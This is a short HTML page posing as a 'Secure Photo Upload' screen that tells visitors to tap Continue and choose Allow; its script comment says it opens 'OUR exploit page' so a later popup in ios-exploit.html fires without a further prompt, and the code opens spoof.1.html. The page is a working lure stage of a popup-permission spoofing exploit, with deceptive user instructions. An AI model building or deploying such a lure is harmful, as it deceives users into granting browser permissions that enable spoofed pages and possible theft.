<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Upload</title>
  <style>
    body { font-family: -apple-system, system-ui, sans-serif; max-width: 520px; margin: 0 auto;
           padding: 2rem 1.2rem; line-height: 1.5; text-align: center; }
    h1 { font-size: 1.3rem; }
    button {
      display: block; width: 100%; margin: 1.2rem 0; padding: 1.1rem; font-size: 1.1rem;
      font-weight: 600; color: #fff; background: #2563eb; border: none; border-radius: 10px;
      cursor: pointer;
    }
    p.hint { color: #666; font-size: .9rem; }
  </style>
</head>
<body>
  <h1>Secure Photo Upload</h1>
  <p class="hint">Tap Continue. When the browser asks, choose <b>Allow</b> to open the upload window.</p>

  <button id="go">Continue</button>

  <script>
    document.getElementById('go').onclick = () => {
      // Open OUR exploit page in a popup (same window). This triggers the
      // "Do you want to open the pop-up?" prompt. Once the user taps Allow,
      // ios-exploit.html opens and the popup permission is granted for this
      // origin — so the window.open inside ios-exploit.html then fires with
      // no further prompt.
      window.open('spoof.1.html');
    };
  </script>
</body>
</html>
